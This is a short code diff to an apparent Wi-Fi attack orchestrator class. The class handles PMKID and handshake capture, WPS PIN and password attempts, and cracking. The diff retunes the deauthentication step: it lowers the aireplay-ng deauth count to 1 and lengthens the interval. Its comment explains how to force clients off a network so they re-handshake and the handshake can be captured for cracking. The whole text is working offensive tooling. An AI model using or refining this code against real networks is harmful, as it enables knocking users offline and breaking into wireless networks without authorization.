@@ -128,7 +128,7 @@ class OmniAttackOrchestrator(threading.Thread):
         pmkid_window: int = 30,
         max_lockouts: int = 3,
         max_deauth_rounds: int = 6,
-        deauth_interval: int = 10,
+        deauth_interval: int = 15,
         max_online_pins: int = 20,
         max_online_passwords: int = 5,
         crack_timeout: int = 600,
@@ -295,7 +295,10 @@ class OmniAttackOrchestrator(threading.Thread):
             if self.capture_manager.handshake_found or self.capture_manager.pmkid_found:
                 self._record("HANDSHAKE", "OK", time.monotonic() - t0, "capture gate satisfied")
                 return True
-            self.attack.deauth_all(bssid, self.mon_iface, count=5, clients=self.clients)
+            # count=1: aireplay-ng sends 64 deauth frames per count unit, so a
+            # single count is already a full kick burst. Larger counts flood
+            # the airtime and clients back off without re-handshaking.
+            self.attack.deauth_all(bssid, self.mon_iface, count=1, clients=self.clients)
             if not self._sleep(self.deauth_interval):
                 break
         ok = bool(self.capture_manager.handshake_found or self.capture_manager.pmkid_found)
